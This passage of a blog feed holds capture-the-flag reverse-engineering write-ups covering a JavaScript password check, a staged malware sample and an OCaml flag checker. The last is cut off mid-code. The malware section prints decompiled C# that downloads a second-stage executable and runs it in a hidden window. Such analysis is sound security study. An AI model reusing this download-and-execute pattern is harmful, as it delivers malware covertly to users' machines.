&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span>) &lt;span style="color:#f92672">:&lt;/span> (&lt;span style="color:#ae81ff">127&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2048&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">192&lt;/span>) &lt;span style="color:#f92672">:&lt;/span> (&lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">224&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">63&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#ae81ff">63&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">_utf8_decode&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">c1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">c2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span>; )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charCodeAt&lt;/span>(&lt;span style="color:#a6e22e">e&lt;/span>)) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span> &lt;span style="color:#f92672">?&lt;/span> (&lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">++&lt;/span>) &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">191&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">224&lt;/span> &lt;span style="color:#f92672">?&lt;/span> (&lt;span style="color:#a6e22e">c2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charCodeAt&lt;/span>(&lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>((&lt;span style="color:#ae81ff">31&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">63&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">c2&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">:&lt;/span> (&lt;span style="color:#a6e22e">c2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charCodeAt&lt;/span>(&lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">c3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charCodeAt&lt;/span>(&lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>((&lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span> &lt;span style="color:#f92672">|&lt;/span> (&lt;span style="color:#ae81ff">63&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">c2&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">63&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">c3&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> , &lt;span style="color:#a6e22e">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document.&lt;span style="color:#a6e22e">login&lt;/span>.&lt;span style="color:#a6e22e">password&lt;/span>.&lt;span style="color:#a6e22e">value&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Q1lCRVJURntNMFIzX04zZzR0MXYzX3RoNG5fNF9wcjB0MG59&amp;#34;&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span>.&lt;span style="color:#a6e22e">encode&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>) &lt;span style="color:#f92672">?&lt;/span> (&lt;span style="color:#a6e22e">alert&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Welcome to admin panel&amp;#34;&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">replace&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;https://www.youtube.com/watch?v=dQw4w9WgXcQ&amp;#34;&lt;/span>)) &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">alert&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;wrong password&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>That bottom string is compared with the password that we can enter, and looks like base64. Let&amp;rsquo;s try to decode it:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#a6e22e">atob&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;Q1lCRVJURntNMFIzX04zZzR0MXYzX3RoNG5fNF9wcjB0MG59&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;CYBERTF{M0R3_N3g4t1v3_th4n_4_pr0t0n}&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And so we have our flag: &lt;code>CYBERTF{M0R3_N3g4t1v3_th4n_4_pr0t0n}&lt;/code>.&lt;/p>
&lt;p>Note that I didn&amp;rsquo;t flag this during the CTF, my teammate &lt;a href="https://ctftime.org/user/46515">R0ck3t&lt;/a> did.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/smasher">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Verify this</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-verify-this/</link><pubDate>Sat, 10 Jul 2021 00:00:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-verify-this/</guid><description>For this challenge, we were given a Stagged.exe executable. Before running it on our machine, we can try to run it against hybrid analysis, an online malware analysis service.
Here is the link to the full report.
We can see in the &amp;ldquo;Network Analysis&amp;rdquo; tab that the program made two requests:
Trying to download the first image gives us a PE file. If we upload it again, we see that it also makes a request to /ordertoexecute.</description><content>&lt;p>For this challenge, we were given a &lt;code>Stagged.exe&lt;/code> executable. Before running it on our machine, we can try to run it against hybrid analysis, an online malware analysis service.&lt;/p>
&lt;p>Here is the &lt;a href="https://www.hybrid-analysis.com/sample/1a071c52e1c94be73f9a2aef069629d61b100e4a52701c7c0921f50211daa6e7/60e138f4125bb815b6267895">link to the full report&lt;/a>.&lt;/p>
&lt;p>We can see in the &amp;ldquo;Network Analysis&amp;rdquo; tab that the program made two requests:&lt;/p>
&lt;p>&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/reverse-verify-this-hybrid-analysis.png" alt="Screenshot of the &amp;amp;ldquo;Network Analysis &amp;gt; HTTP Traffic&amp;amp;rdquo; part of the report">&lt;/p>
&lt;p>Trying to download the first image gives us a PE file. If we upload it again, we see that it also makes a request to &lt;code>/ordertoexecute.gif&lt;/code>, so we can assume that &lt;code>Stagged.exe&lt;/code> doesn&amp;rsquo;t contain the &amp;ldquo;main&amp;rdquo; code, &lt;code>index.jpg&lt;/code> does.&lt;/p>
&lt;p>The name of the binary is fitting: &lt;code>Stagged.exe&lt;/code> probably refers to a &amp;ldquo;staged&amp;rdquo; malware, which downloads one or more stages that contains the actual nefarious code.&lt;/p>
&lt;p>We can take a look at the second image:&lt;/p>
&lt;p>&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/ordertoexecute.gif" alt="The second image, a GIF from star wars">&lt;/p>
&lt;p>Now this is where I stopped when I was doing the CTF. I tried a few steganography tools but none worked. &lt;a href="https://www.root-me.org/nobodyisnobody">Nobodyisnobody&lt;/a> found the tool that you had to use: &lt;a href="http://manpages.ubuntu.com/manpages/bionic/man1/stegosuite.1.html">stegosuite&lt;/a>.&lt;/p>
&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/stego-suite.png" alt="Stegosuite extracting the flag" class="center" />
&lt;p>The flag was &lt;code>CYBERTF{Gr3at_J0b_Ag3nt}&lt;/code>.&lt;/p>
&lt;hr>
&lt;p>When I did not find any message encoded in the image, I started looking at the binary itself. It&amp;rsquo;s a Mono/.Net program, probably obfuscated using something like &lt;a href="https://www.gapotchenko.com/eazfuscator.net">Eazfuscator&lt;/a>. I say that because &lt;a href="https://github.com/icsharpcode/ILSpy">ILSpy&lt;/a>, a .NET decompiler, spits out mangled function names, encoded strings, &amp;hellip;&lt;/p>
&lt;p>The function responsible for downloading the second stage is this one:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cs" data-lang="cs">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// \u0005\u2000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> System;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> System.Diagnostics;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> System.Net;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> System.Threading;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">internal&lt;/span> &lt;span style="color:#66d9ef">sealed&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0005&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#66d9ef">string&lt;/span>[] &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0003.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">string&lt;/span> text = &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443472&lt;/span>) + Environment.UserName + &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443456&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">string&lt;/span> text2 = &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443518&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">string&lt;/span> text3 = &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443500&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">string&lt;/span> text4 = &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443570&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">string&lt;/span> text5 = &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> WebClient webClient = &lt;span style="color:#66d9ef">new&lt;/span> WebClient();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> webClient.Headers.Set(&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443554&lt;/span>), &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443863&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> webClient.Headers.Add(&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443847&lt;/span>), &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443894&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> webClient.Headers.Add(&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443964&lt;/span>), &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443734&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> webClient.Headers.Add(&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443719&lt;/span>), &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443769&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> text5 = text3 + text4;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> webClient.DownloadFile(text5, text + &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443757&lt;/span>) + text2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Thread.Sleep(&lt;span style="color:#ae81ff">36000&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Process.Start(&lt;span style="color:#66d9ef">new&lt;/span> ProcessStartInfo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CreateNoWindow = &lt;span style="color:#66d9ef">true&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UseShellExecute = &lt;span style="color:#66d9ef">false&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> FileName = text + &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443757&lt;/span>) + text2,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> WindowStyle = ProcessWindowStyle.Hidden
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> });
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now I could also have analyzed the second stage, a Go binary, but it is quite fat (6mb), so I stopped there.&lt;/p>
&lt;hr>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/verify-this">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Flag checker</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-flag-checker/</link><pubDate>Fri, 09 Jul 2021 00:01:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-flag-checker/</guid><description>For this challenge, we were given a program executable.
$ ./program ./program FLAG $ ./program MYFLAG failed Seems like it valides the flag that is passed as an argument. Let&amp;rsquo;s open the binary in Ghidra.
There are a lot of functions defined, and looking at the exports we see that quite a lot of them start with caml_. I didn&amp;rsquo;t know you could compile OCaml to C, that&amp;rsquo;s pretty neat.</description><content>&lt;p>For this challenge, we were given a &lt;code>program&lt;/code> executable.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ./program
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>./program FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./program MYFLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>failed
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Seems like it valides the flag that is passed as an argument. Let&amp;rsquo;s open the binary in Ghidra.&lt;/p>
&lt;p>There are a lot of functions defined, and looking at the exports we see that quite a lot of them start with &lt;code>caml_&lt;/code>. I didn&amp;rsquo;t know you could compile OCaml to C, that&amp;rsquo;s pretty neat.&lt;/p>
&lt;p>We can pinpoint the function that checks the flag by searching for strings. After looking for the event&amp;rsquo;s flag format, &lt;code>CYBERTF{...}&lt;/code>, we find a fake flag: &lt;code>CYBERTF{Not-S0Easy-Fake-Flag}&lt;/code>. One function references it:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>undefined8 &lt;span style="color:#a6e22e">camlReverse__entry&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> lVar1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> byte bVar2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> lVar3;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlReverse &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PTR_caml_curry2_00160098;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DAT_00160150 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PTR_caml_curry2_001600b8;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DAT_00160158 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PTR_caml_curry2_001600d8;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DAT_00160160 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PTR_camlReverse__char2int_207_001600f8;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DAT_00160168 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PTR_camlReverse__string2char_211_00160110;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DAT_00160170 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PTR_caml_curry2_00160128;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DAT_00160178 &lt;span style="color:#f92672">=&lt;/span> camlReverse__1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DAT_00160180 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>camlReverse__9;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DAT_00160188 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>camlReverse__19;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DAT_00160190 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>camlReverse__82;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lVar3 &lt;span style="color:#f92672">=&lt;/span> caml_c_call(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ((&lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(lVar3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>) {
